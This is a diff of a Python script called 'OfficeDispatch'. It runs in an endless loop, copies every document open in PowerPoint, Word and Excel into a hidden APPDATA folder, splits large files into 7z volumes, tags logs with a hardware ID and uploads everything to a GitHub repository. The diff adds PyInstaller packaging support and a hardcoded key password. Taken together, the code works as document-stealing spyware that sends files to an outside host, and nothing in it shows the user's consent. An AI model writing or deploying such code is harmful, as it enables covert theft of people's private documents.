@@ -1,16 +1,18 @@
-import win32com.client
-import xlwings as xw
 import os
-import shutil
-import datetime
+import sys
 import time
-import hashlib
 import json
-from cryptography.fernet import Fernet
-import base64
-from github import Github
-import platform
 import queue
+import xlwings as xw
+import shutil
+import hashlib
+import platform
+import datetime
+import base64
+import subprocess
+import win32com.client
+from github import Github
+from cryptography.fernet import Fernet
 
 DEFAULT_CONFIG = {
     "repo_name": "your_repo_name",
@@ -19,10 +21,12 @@ DEFAULT_CONFIG = {
     "check_interval": 30
 }
 
-script_dir = os.path.dirname(os.path.abspath(__file__))
+if getattr(sys, 'frozen', False): # For pyinstaller
+    script_dir = os.path.dirname(sys.executable)
+else:
+    script_dir = os.path.dirname(os.path.abspath(__file__))
 CONFIG_PATH = os.path.join(script_dir, "config.json")
-PASSWORD = "enter_your_password_here" # Encrypt your github token
-
+PASSWORD = "OfficeDispatch_Script_By_LtgX__Password1145141919810"
 current_date = datetime.datetime.now().strftime("%Y.%m.%d")
 key = base64.urlsafe_b64encode(hashlib.sha256(PASSWORD.encode()).digest())
 appdata_path = os.getenv('APPDATA')
@@ -30,14 +34,14 @@ repo_path = os.path.join(appdata_path, "OfficeDispatch")
 LOG_FILE_PATH = os.path.join(repo_path, current_date, f'{current_date}.log')
 cipher_suite = Fernet(key)
 upload_queue = queue.Queue()
-global log_initialized
-log_initialized = False
 
+log_initialized = False
 
 def log_message(message, log_file_path=LOG_FILE_PATH):
     global log_initialized
     log_dir = os.path.dirname(log_file_path)
-    os.makedirs(log_dir, exist_ok=True)  
+    os.makedirs(log_dir, exist_ok=True)
+
     if not log_initialized:
         if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
             with open(log_file_path, 'a', encoding='utf-8') as log:
@@ -117,7 +121,7 @@ def initialize_com_object(app_name):
             app = win32com.client.Dispatch(app_name)
             return app
         except Exception as e:
-            print(f"Error initializing {app_name}: {e}. Retrying in {config['retry_interval']} seconds...")
+            log_message(f"Error initializing {app_name}: {e}. Retrying in {config['retry_interval']} seconds...")
             time.sleep(config['retry_interval'])
             attempt += 1
     return None
@@ -126,7 +130,6 @@ ppt = initialize_com_object("PowerPoint.Application")
 word = initialize_com_object("Word.Application")
 os.makedirs(repo_path, exist_ok=True)
 processed_files = set()
-log_initialized = False
 
 def calculate_md5(file_path):
     hash_md5 = hashlib.md5()
@@ -135,45 +138,95 @@ def calculate_md5(file_path):
             hash_md5.update(chunk)
     return hash_md5.hexdigest()
 
-def copy_file(file_name, file_size, category, target_folder, log_file_path):
+def split_and_compress_file(file_path, output_dir, volume_size=25*1024*1024):
+    base_name = os.path.basename(file_path)
+    os.makedirs(output_dir, exist_ok=True)
+    archive_path = os.path.join(output_dir, base_name)
+    archive_name = os.path.join(archive_path, base_name + ".7z")
+    try:
+        volume_size_mb = volume_size // (1024 * 1024)
+        zip = [
+            '7z', 'a', '-v{}m'.format(volume_size_mb), '-mx=1', archive_name, file_path
+        ]
+        subprocess.run(zip, shell=True)
+        part_file_paths = [os.path.join(archive_path, f) for f in os.listdir(archive_path) if f.startswith(base_name)]
+
+        info_path = os.path.join(archive_path, "info.json")
+        info_data = {
+            "original_file_path": file_path,
+            "original_file_size": os.path.getsize(file_path),
+            "part_count": len(part_file_paths),
+            "parts": [{"part_number": i+1, "part_size": os.path.getsize(part_file)} for i, part_file in enumerate(part_file_paths)]
+        }
+        with open(info_path, 'w') as info_file:
+            json.dump(info_data, info_file, indent=4)
+
+        log_message(f"File {file_path} is too large, split and compressed into {archive_path} with {len(part_file_paths)} parts", LOG_FILE_PATH)
+        for part_file_path in part_file_paths:
+            upload_queue.put(part_file_path)
+        
+        processed_files.add(file_path)
+    except subprocess.CalledProcessError as e:
+        log_message(f"Failed to compress {file_path} with error: {e}", LOG_FILE_PATH)
+
+def copy_file(file_name, file_size, category, target_folder, log_file_path=LOG_FILE_PATH):
     try:
         dest_folder = os.path.join(target_folder, category)
-        dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
-
-        if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
-            log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
-            return False
-
-        shutil.copy(file_name, dest_folder)
-        log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
+        if file_size > 25 * 1024 * 1024:
+            split_and_compress_file(file_name, dest_folder)
+        else:
+            dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
+            if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
+                log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
+                return False
+            shutil.copy(file_name, dest_folder)
+            log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
+            upload_queue.put(dest_file_path)
+            processed_files.add(file_name)
         return True
     except Exception as e:
         log_message(f"Failed to copy {file_name} due to {e}", log_file_path)
         return False
-
+    
+def refresh_com_object(app_name):
+    try:
+        app = win32com.client.Dispatch(app_name)
+        return app
+    except Exception as e:
+        log_message(f"Error initializing {app_name}: {e}")
+        return None
+    
 def process_files():
     try:
         target_folder = os.path.join(repo_path, current_date)
-        log_file_path = os.path.join(repo_path, current_date, f'{current_date}.log')
         for folder in ["PowerPoint", "Excel", "Word"]:
             os.makedirs(os.path.join(target_folder, folder), exist_ok=True)
-        
+        for main_folder in ["PowerPoint", "Excel", "Word"]:
+            main_folder_path = os.path.join(target_folder, main_folder)
+            for subfolder in os.listdir(main_folder_path):
+                subfolder_path = os.path.join(main_folder_path, subfolder)
+                if os.path.isdir(subfolder_path):
+                    info_path = os.path.join(subfolder_path, "info.json")
+                    if os.path.exists(info_path):
+                        with open(info_path, 'r') as info_file:
+                            info_data = json.load(info_file)
+                            processed_files.add(info_data["original_file_path"])
         office_apps = [
             (ppt, "PowerPoint", lambda app: app.Presentations, lambda pres: pres.FullName),
             (xw.apps.active, "Excel", lambda app: app.books, lambda book: book.fullname),
             (word, "Word", lambda app: app.Documents, lambda doc: doc.FullName)
         ]
-        
+
         for app, folder_name, get_items, get_filename in office_apps:
             if app:
                 for item in get_items(app):
-                    file_name = get_filename(item)
+                    file_name = os.path.abspath(get_filename(item))
                     if file_name not in processed_files:
                         processed_files.add(file_name)
                         file_size = os.path.getsize(file_name)
-                        if copy_file(file_name, file_size, folder_name, target_folder, log_file_path):
+                        if copy_file(file_name, file_size, folder_name, target_folder):
                             upload_queue.put(os.path.join(target_folder, folder_name, os.path.basename(file_name)))
-        return log_file_path
+        return LOG_FILE_PATH
     except Exception as e:
         log_message(f"Error in processing files: {e}")
         return None
@@ -185,84 +238,110 @@ def get_hwid():
     node = platform.node()
     hwid_source = f"{processor}_{system_version}_{machine}_{node}"
     hwid = hashlib.sha256(hwid_source.encode()).hexdigest()
-    
     return hwid
 
-def check_and_rename_yesterday_log():
-    yesterday_date = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y.%m.%d")
-    yesterday_folder = os.path.join(repo_path, yesterday_date)
-    if os.path.exists(yesterday_folder):
-        hwid = get_hwid()
-        log_file = os.path.join(yesterday_folder, f'{yesterday_date}.log')
-        if os.path.exists(log_file):
-            new_log_file = os.path.join(yesterday_folder, f"{yesterday_date}_{hwid}.log")
-            os.rename(log_file, new_log_file)
-            upload_queue.put(new_log_file)
-            return new_log_file, yesterday_folder
+def check_and_rename_previous_logs():
+    current_date = datetime.datetime.now().strftime("%Y.%m.%d")
+    last_uploaded_file = os.path.join(repo_path, 'last_uploaded_date.txt')
+    if os.path.exists(last_uploaded_file):
+        with open(last_uploaded_file, 'r') as f:
+            start_date = f.read().strip()
+    else:
+        start_date = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y.%m.%d")
+    
+    while start_date < current_date:
+        log_folder = os.path.join(repo_path, start_date)
+        if os.path.exists(log_folder):
+            hwid = get_hwid()
+            log_file = os.path.join(log_folder, f'{start_date}.log')
+            if os.path.exists(log_file):
+                new_log_file = os.path.join(log_folder, f"{start_date}_{hwid}.log")
+                if not os.path.exists(new_log_file):
+                    os.rename(log_file, new_log_file)
+                    upload_queue.put(new_log_file)
+                    with open(last_uploaded_file, 'w') as f:
+                        f.write(start_date)
+                    return new_log_file, log_folder
+        start_date = (datetime.datetime.strptime(start_date, "%Y.%m.%d") + datetime.timedelta(days=1)).strftime("%Y.%m.%d")
     return None, None
 
-def upload_files_to_github(repo_name, token, upload_queue, log_file_path):
-    g = Github(token)
-    user = g.get_user()
-    repo = user.get_repo(repo_name)
-
-    while not upload_queue.empty():
-        file_path = upload_queue.get()
-        with open(file_path, "rb") as file:
-            content = file.read()
-        file_name = os.path.basename(file_path)
-        full_rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
-        commit_message_upload = f"Upload {file_name}"
-        commit_message_update = f"Update {file_name}"
-        attempt = 0
-        success = False
-        while attempt < config['retry_interval'] and not success:
+def upload_files_to_github(repo_name, token, upload_queue, log_file_path=LOG_FILE_PATH):
+    try:
+        g = Github(token)
+        user = g.get_user()
+        repo = user.get_repo(repo_name)
+        successful_uploads = []
+        failed_uploads = []
+        while not upload_queue.empty():
+            file_path = upload_queue.get()
             try:
-                existing_file = repo.get_contents(full_rel_path)
-                repo.update_file(
-                    path=full_rel_path,
-                    message=commit_message_update,
-                    content=content,
-                    sha=existing_file.sha,
-                    branch="main"
-                )
-                log_message(f"Updated {full_rel_path}", log_file_path)
-                success = True
-            except Exception as e:
-                if str(e).startswith('404'):
+                with open(file_path, "rb") as file:
+                    content = file.read()
+                file_name = os.path.basename(file_path)
+                full_rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
+                commit_message_upload = f"Upload {file_name}"
+                commit_message_update = f"Update {file_name}"
+                attempt = 0
+                success = False
+                while attempt < config['retry_interval'] and not success:
                     try:
-                        repo.create_file(
-                            path=full_rel_path,
-                            message=commit_message_upload,
-                            content=content,
-                            branch="main"
-                        )
-                        log_message(f"Uploaded {full_rel_path}", log_file_path)
+                        existing_file = repo.get_contents(full_rel_path)
+                        if existing_file:
+                            repo.update_file(
+                                path=full_rel_path,
+                                message=commit_message_update,
+                                content=content,
+                                sha=existing_file.sha,
+                                branch="main"
+                            )
+                        else:
+                            repo.create_file(
+                                path=full_rel_path,
+                                message=commit_message_upload,
+                                content=content,
+                                branch="main"
+                            )
                         success = True
-                    except Exception as create_e:
-                        log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
-                        time.sleep(config['retry_interval'])
-                        attempt += 1
+                    except Exception as e:
+                        if '404' in str(e):
+                            try:
+                                repo.create_file(
+                                    path=full_rel_path,
+                                    message=commit_message_upload,
+                                    content=content,
+                                    branch="main"
+                                )
+                                success = True
+                            except Exception as create_e:
+                                log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
+                                time.sleep(config['retry_interval'])
+                                attempt += 1
+                        else:
+                            log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
+                            time.sleep(config['retry_interval'])
+                            attempt += 1
+                if success:
+                    successful_uploads.append(full_rel_path)
                 else:
-                    log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
-                    time.sleep(config['retry_interval'])
-                    attempt += 1
+                    failed_uploads.append(full_rel_path)
+            except Exception as e:
+                failed_uploads.append(full_rel_path)
+                log_message(f"Error processing file {file_path}: {e}", log_file_path)
+            finally:
+                upload_queue.task_done()
+        
+        if successful_uploads:
+            log_message(f"Successfully uploaded: {', '.join(successful_uploads)}", log_file_path)
+        if failed_uploads:
+            log_message(f"Failed to upload: {', '.join(failed_uploads)}", log_file_path)
+    except Exception as e:
+        log_message(f"Error in upload_files_to_github: {e}", log_file_path)
 
-        if not success:
-            log_message(f"Failed to process {full_rel_path} after multiple attempts.")
-        upload_queue.task_done()
-def main():
-    while True:
-        if ppt is None:
-            ppt = initialize_com_object("PowerPoint.Application")
-        if word is None:
-            word = initialize_com_object("Word.Application")
-
-        log_file_path = process_files()
-        if log_file_path:
-            check_and_rename_yesterday_log()
-            upload_files_to_github(config['repo_name'], config['github_token'], upload_queue, log_file_path)
-        time.sleep(config['check_interval'])
-
-if __name__ == "__main__":
-    main()
+while True:
+    ppt = refresh_com_object("PowerPoint.Application")
+    word = refresh_com_object("Word.Application")
+    log_file_path = process_files()
+    if log_file_path:
+        check_and_rename_previous_logs()
+        upload_files_to_github(config['repo_name'], config['github_token'], upload_queue, log_file_path)
+    time.sleep(config['check_interval'])
